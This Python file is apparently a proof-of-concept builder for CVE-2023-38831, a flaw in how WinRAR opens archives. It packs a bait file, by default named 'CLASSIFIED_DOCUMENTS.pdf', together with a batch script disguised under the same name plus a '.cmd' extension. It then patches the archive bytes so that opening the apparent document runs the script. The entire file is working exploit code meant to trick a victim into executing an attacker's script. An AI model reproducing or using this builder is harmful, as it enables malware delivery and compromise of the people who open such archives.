import shutil
import os
import sys
from os.path import join
TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"
BAIT_NAME = "CLASSIFIED_DOCUMENTS.pdf"
SCRIPT_NAME = "script.bat"


def create_template_and_rar(f_embedded,f_script,f_name_out):
    BAIT_NAME = os.path.basename(f_embedded)
    SCRIPT_NAME = os.path.basename(f_script)
    OUTPUT_NAME = os.path.basename(f_name_out)



    BAIT_EXT = b"." + BAIT_NAME.split(".")[-1].encode("utf-8")

    # print("BAIT_NAME:", BAIT_NAME)
    # print("SCRIPT_NAME:", SCRIPT_NAME)
    # print("OUTPUT_NAME:", OUTPUT_NAME)

    if os.path.exists(TEMPLATE_NAME):
        shutil.rmtree(TEMPLATE_NAME)
    os.mkdir(TEMPLATE_NAME)
    d = join(TEMPLATE_NAME, BAIT_NAME + "A")
    if not os.path.exists(d):
        os.mkdir(d)

    shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME+"A.cmd"))
    shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME+"B"))

# if os.path.exists(OUTPUT_NAME):
#     print("!!! dir %s exists, delete it first" %(OUTPUT_NAME))
#     sys.exit()

    shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

    with open(TEMPLATE_NAME + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
        content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

    os.remove(TEMPLATE_NAME + ".zip")

    with open(OUTPUT_NAME, "wb")  as f:
        f.write(content)

